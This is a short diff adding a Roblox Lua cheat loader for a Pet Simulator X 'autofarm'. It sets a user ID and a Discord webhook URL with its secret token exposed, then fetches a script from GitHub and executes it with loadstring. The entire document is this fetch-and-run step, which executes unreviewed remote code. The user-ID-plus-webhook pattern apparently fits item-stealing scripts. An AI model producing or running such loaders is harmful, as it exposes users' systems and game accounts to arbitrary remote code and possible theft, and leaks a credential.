@@ -1,0 +1,3 @@
+_G.UserID = 840524884
+_G.WebHook = "https://discord.com/api/webhooks/1005333656891560038/gyTH4JYeXmv5YQ2O8AYw56jVtdXBBXmKh9C3Ls7x045y5vSOSO9Ap3JFg9AI3N0eiEIT"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImZung/PsxAutofarm/main/petsimxAutofarm"))()
